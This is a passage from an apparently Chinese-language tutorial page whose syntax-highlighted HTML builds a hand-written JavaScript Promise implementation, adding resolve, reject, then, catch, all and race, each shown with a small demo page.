class_">Promise</span>.<span class="title function_">resolve</span>(<span class="string">&#x27;Oh Yeah&#x27;</span>));</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(p3);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//Promise.reject</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> p4 = <span class="title class_">Promise</span>.<span class="title function_">reject</span>(<span class="string">&#x27;Error&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> p5 = <span class="title class_">Promise</span>.<span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">resolve</span>(<span class="string">&#x27;OK&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;));</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(p4);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(p5);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Promise-all-方法实现"><a href="#Promise-all-方法实现" class="headerlink" title="Promise.all 方法实现"></a>Promise.all 方法实现</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//声明构造函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Promise</span>(<span class="params">executor</span>)&#123;</span><br><span class="line">    <span class="comment">//添加属性</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">PromiseState</span> = <span class="string">&#x27;pending&#x27;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">PromiseResult</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">//声明属性</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">callbacks</span> = [];</span><br><span class="line">    <span class="comment">//保存实例对象的 this 的值</span></span><br><span class="line">    <span class="keyword">const</span> self = <span class="variable language_">this</span>;<span class="comment">// self _this that</span></span><br><span class="line">    <span class="comment">//resolve 函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">resolve</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="comment">//判断状态</span></span><br><span class="line">        <span class="keyword">if</span>(self.<span class="property">PromiseState</span> !== <span class="string">&#x27;pending&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//1. 修改对象的状态 (promiseState)</span></span><br><span class="line">        self.<span class="property">PromiseState</span> = <span class="string">&#x27;fulfilled&#x27;</span>;<span class="comment">// resolved</span></span><br><span class="line">        <span class="comment">//2. 设置对象结果值 (promiseResult)</span></span><br><span class="line">        self.<span class="property">PromiseResult</span> = data;</span><br><span class="line">        <span class="comment">//调用成功的回调函数</span></span><br><span class="line">        self.<span class="property">callbacks</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">            item.<span class="title function_">onResolved</span>(data);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//reject 函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">reject</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="comment">//判断状态</span></span><br><span class="line">        <span class="keyword">if</span>(self.<span class="property">PromiseState</span> !== <span class="string">&#x27;pending&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//1. 修改对象的状态 (promiseState)</span></span><br><span class="line">        self.<span class="property">PromiseState</span> = <span class="string">&#x27;rejected&#x27;</span>;<span class="comment">// </span></span><br><span class="line">        <span class="comment">//2. 设置对象结果值 (promiseResult)</span></span><br><span class="line">        self.<span class="property">PromiseResult</span> = data;</span><br><span class="line">        <span class="comment">//执行失败的回调</span></span><br><span class="line">        self.<span class="property">callbacks</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">            item.<span class="title function_">onRejected</span>(data);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">//同步调用『执行器函数』</span></span><br><span class="line">        <span class="title function_">executor</span>(resolve, reject);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="comment">//修改 promise 对象状态为『失败』</span></span><br><span class="line">        <span class="title function_">reject</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加 then 方法</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">then</span> = <span class="keyword">function</span>(<span class="params">onResolved, onRejected</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> self = <span class="variable language_">this</span>;</span><br><span class="line">    <span class="comment">//判断回调函数参数</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> onRejected !== <span class="string">&#x27;function&#x27;</span>)&#123;</span><br><span class="line">        onRejected = <span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> reason;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> onResolved !== <span class="string">&#x27;function&#x27;</span>)&#123;</span><br><span class="line">        onResolved = <span class="function"><span class="params">value</span> =&gt;</span> value;</span><br><span class="line">        <span class="comment">//value =&gt; &#123; return value&#125;;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">//封装函数</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">callback</span>(<span class="params">type</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="comment">//获取回调函数的执行结果</span></span><br><span class="line">                <span class="keyword">let</span> result = <span class="title function_">type</span>(self.<span class="property">PromiseResult</span>);</span><br><span class="line">                <span class="comment">//判断</span></span><br><span class="line">                <span class="keyword">if</span>(result <span class="keyword">instanceof</span> <span class="title class_">Promise</span>)&#123;</span><br><span class="line">                    <span class="comment">//如果是 Promise 类型的对象</span></span><br><span class="line">                    result.<span class="title function_">then</span>(<span class="function"><span class="params">v</span> =&gt;</span> &#123;</span><br><span class="line">                        <span class="title function_">resolve</span>(v);</span><br><span class="line">                    &#125;, <span class="function"><span class="params">r</span>=&gt;</span>&#123;</span><br><span class="line">                        <span class="title function_">reject</span>(r);</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="comment">//结果的对象状态为『成功』</span></span><br><span class="line">                    <span class="title function_">resolve</span>(result);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">                <span class="title function_">reject</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//调用回调函数  PromiseState</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;fulfilled&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_">callback</span>(onResolved);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;rejected&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_">callback</span>(onRejected);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//判断 pending 状态</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;pending&#x27;</span>)&#123;</span><br><span class="line">            <span class="comment">//保存回调函数</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">callbacks</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">                <span class="attr">onResolved</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                    <span class="title function_">callback</span>(onResolved);</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">onRejected</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                    <span class="title function_">callback</span>(onRejected);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加 catch 方法</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">catch</span> = <span class="keyword">function</span>(<span class="params">onRejected</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">then</span>(<span class="literal">undefined</span>, onRejected);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加 resolve 方法</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property">resolve</span> = <span class="keyword">function</span>(<span class="params">value</span>)&#123;</span><br><span class="line">    <span class="comment">//返回promise对象</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(value <span class="keyword">instanceof</span> <span class="title class_">Promise</span>)&#123;</span><br><span class="line">            value.<span class="title function_">then</span>(<span class="function"><span class="params">v</span>=&gt;</span>&#123;</span><br><span class="line">                <span class="title function_">resolve</span>(v);</span><br><span class="line">            &#125;, <span class="function"><span class="params">r</span>=&gt;</span>&#123;</span><br><span class="line">                <span class="title function_">reject</span>(r);</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//状态设置为成功</span></span><br><span class="line">            <span class="title function_">resolve</span>(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加 reject 方法</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property">reject</span> = <span class="keyword">function</span>(<span class="params">reason</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>)=&gt;</span>&#123;</span><br><span class="line">        <span class="title function_">reject</span>(reason);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加 all 方法</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property">all</span> = <span class="keyword">function</span>(<span class="params">promises</span>)&#123;</span><br><span class="line">    <span class="comment">//返回结果为promise对象</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">//声明变量</span></span><br><span class="line">        <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">let</span> arr = [];</span><br><span class="line">        <span class="comment">//遍历</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;promises.<span class="property">length</span>;i++)&#123;</span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            promises[i].<span class="title function_">then</span>(<span class="function"><span class="params">v</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="comment">//得知对象的状态是成功</span></span><br><span class="line">                <span class="comment">//每个promise对象 都成功</span></span><br><span class="line">                count++;</span><br><span class="line">                <span class="comment">//将当前promise对象成功的结果 存入到数组中</span></span><br><span class="line">                arr[i] = v;</span><br><span class="line">                <span class="comment">//判断</span></span><br><span class="line">                <span class="keyword">if</span>(count === promises.<span class="property">length</span>)&#123;</span><br><span class="line">                    <span class="comment">//修改状态</span></span><br><span class="line">                    <span class="title function_">resolve</span>(arr);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, <span class="function"><span class="params">r</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="title function_">reject</span>(r);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Promise-封装 | 14 - Promise.all 封装<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./promise.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> p1 = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">resolve</span>(<span class="string">&#x27;OK&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;, <span class="number">1000</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> p2 = <span class="title class_">Promise</span>.<span class="title function_">reject</span>(<span class="string">&#x27;Success&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> p3 = <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="string">&#x27;Oh Yeah&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//调用 all 方法</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> result = <span class="title class_">Promise</span>.<span class="title function_">all</span>([p1, p2, p3]);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Promise-race-方法实现"><a href="#Promise-race-方法实现" class="headerlink" title="Promise.race 方法实现"></a>Promise.race 方法实现</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//声明构造函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Promise</span>(<span class="params">executor</span>)&#123;</span><br><span class="line">    <span class="comment">//添加属性</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">PromiseState</span> = <span class="string">&#x27;pending&#x27;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">PromiseResult</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">//声明属性</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">callbacks</span> = [];</span><br><span class="line">    <span class="comment">//保存实例对象的 this 的值</span></span><br><span class="line">    <span class="keyword">const</span> self = <span class="variable language_">this</span>;<span class="comment">// self _this that</span></span><br><span class="line">    <span class="comment">//resolve 函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">resolve</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="comment">//判断状态</span></span><br><span class="line">        <span class="keyword">if</span>(self.<span class="property">PromiseState</span> !== <span class="string">&#x27;pending&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//1. 修改对象的状态 (promiseState)</span></span><br><span class="line">        self.<span class="property">PromiseState</span> = <span class="string">&#x27;fulfilled&#x27;</span>;<span class="comment">// resolved</span></span><br><span class="line">        <span class="comment">//2. 设置对象结果值 (promiseResult)</span></span><br><span class="line">        self.<span class="property">PromiseResult</span> = data;</span><br><span class="line">        <span class="comment">//调用成功的回调函数</span></span><br><span class="line">        self.<span class="property">callbacks</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">            item.<span class="title function_">onResolved</span>(data);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//reject 函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">reject</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="comment">//判断状态</span></span><br><span class="line">        <span class="keyword">if</span>(self.<span class="property">PromiseState</span> !== <span class="string">&#x27;pending&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//1. 修改对象的状态 (promiseState)</span></span><br><span class="line">        self.<span class="property">PromiseState</span> = <span class="string">&#x27;rejected&#x27;</span>;<span class="comment">// </span></span><br><span class="line">        <span class="comment">//2. 设置对象结果值 (promiseResult)</span></span><br><span class="line">        self.<span class="property">PromiseResult</span> = data;</span><br><span class="line">        <span class="comment">//执行失败的回调</span></span><br><span class="line">        self.<span class="property">callbacks</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">            item.<span class="title function_">onRejected</span>(data);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">//同步调用『执行器函数』</span></span><br><span class="line">        <span class="title function_">executor</span>(resolve, reject);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="comment">//修改 promise 对象状态为『失败』</span></span><br><span class="line">        <span class="title function_">reject</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加 then 方法</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">then</span> = <span class="keyword">function</span>(<span class="params">onResolved, onRejected</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> self = <span class="variable language_">this</span>;</span><br><span class="line">    <span class="comment">//判断回调函数参数</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> onRejected !== <span class="string">&#x27;function&#x27;</span>)&#123;</span><br><span class="line">        onRejected = <span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> reason;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> onResolved !== <span class="string">&#x27;function&#x27;</span>)&#123;</span><br><span class="line">        onResolved = <span class="function"><span class="params">value</span> =&gt;</span> value;</span><br><span class="line">        <span class="comment">//value =&gt; &#123; return value&#125;;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">//封装函数</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">callback</span>(<span class="params">type</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="comment">//获取回调函数的执行结果</span></span><br><span class="line">                <span class="keyword">let</span> result = <span class="title function_">type</span>(self.<span class="property">PromiseResult</span>);</span><br><span class="line">                <span class="comment">//判断</span></span><br><span class="line">                <span class="keyword">if</span>(result <span class="keyword">instanceof</span> <span class="title class_">Promise</span>)&#123;</span><br><span class="line">                    <span class="comment">//如果是 Promise 类型的对象</span></span><br><span class="line">                    result.<span class="title function_">then</span>(<span class="function"><span class="params">v</span> =&gt;</span> &#123;</span><br><span class="line">                        <span class="title function_">resolve</span>(v);</span><br><span class="line">                    &#125;, <span class="function"><span class="params">r</span>=&gt;</span>&#123;</span><br><span class="line">                        <span class="title function_">reject</span>(r);</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="comment">//结果的对象状态为『成功』</span></span><br><span class="line">                    <span class="title function_">resolve</span>(result);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">                <span class="title function_">reject</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//调用回调函数  PromiseState</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;fulfilled&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_">callback</span>(onResolved);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;rejected&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_">callback</span>(onRejected);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//判断 pending 状态</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;pending&#x27;</span>)&#123;</span><br><span class="line">            <span class="comment">//保存回调函数</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">callbacks</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">                <span class="attr">onResolved</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                    <span class="title function_">callback</span>(onResolved);</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">onRejected</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                    <span class="title function_">callback</span>(onRejected);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加 catch 方法</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">catch</span> = <span class="keyword">function</span>(<span class="params">onRejected</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">then</span>(<span class="literal">undefined</span>, onRejected);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加 resolve 方法</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property">resolve</span> = <span class="keyword">function</span>(<span class="params">value</span>)&#123;</span><br><span class="line">    <span class="comment">//返回promise对象</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(value <span class="keyword">instanceof</span> <span class="title class_">Promise</span>)&#123;</span><br><span class="line">            value.<span class="title function_">then</span>(<span class="function"><span class="params">v</span>=&gt;</span>&#123;</span><br><span class="line">                <span class="title function_">resolve</span>(v);</span><br><span class="line">            &#125;, <span class="function"><span class="params">r</span>=&gt;</span>&#123;</span><br><span class="line">                <span class="title function_">reject</span>(r);</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//状态设置为成功</span></span><br><span class="line">            <span class="title function_">resolve</span>(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加 reject 方法</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property">reject</span> = <span class="keyword">function</span>(<span class="params">reason</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>)=&gt;</span>&#123;</span><br><span class="line">        <span class="title function_">reject</span>(reason);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加 all 方法</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property">all</span> = <span class="keyword">function</span>(<span class="params">promises</span>)&#123;</span><br><span class="line">    <span class="comment">//返回结果为promise对象</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">//声明变量</span></span><br><span class="line">        <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">let</span> arr = [];</span><br><span class="line">        <span class="comment">//遍历</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;promises.<span class="property">length</span>;i++)&#123;</span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            promises[i].<span class="title function_">then</span>(<span class="function"><span class="params">v</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="comment">//得知对象的状态是成功</span></span><br><span class="line">                <span class="comment">//每个promise对象 都成功</span></span><br><span class="line">                count++;</span><br><span class="line">                <span class="comment">//将当前promise对象成功的结果 存入到数组中</span></span><br><span class="line">                arr[i] = v;</span><br><span class="line">                <span class="comment">//判断</span></span><br><span class="line">                <span class="keyword">if</span>(count === promises.<span class="property">length</span>)&#123;</span><br><span class="line">                    <span class="comment">//修改状态</span></span><br><span class="line">                    <span class="title function_">resolve</span>(arr);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, <span class="function"><span class="params">r</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="title function_">reject</span>(r);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加 race 方法</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property">race</span> = <span class="keyword">function</span>(<span class="params">promises</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;promises.<span class="property">length</span>;i++)&#123;</span><br><span class="line">            promises[i].<span class="title function_">then</span>(<span class="function"><span class="params">v</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="comment">//修改返回对象的状态为 『成功』</span></span><br><span class="line">                <span class="title function_">resolve</span>(v);</span><br><span class="line">            &#125;,<span class="function"><span class="params">r</span>=&gt;</span>&#123;</span><br><span class="line">                <span class="comment">//修改返回对象的状态为 『失败』</span></span><br><span class="line">                <span class="title function_">reject</span>(r);</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Promise-封装 | 15 - Promise.race 封装<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./promise.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> p1 = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span 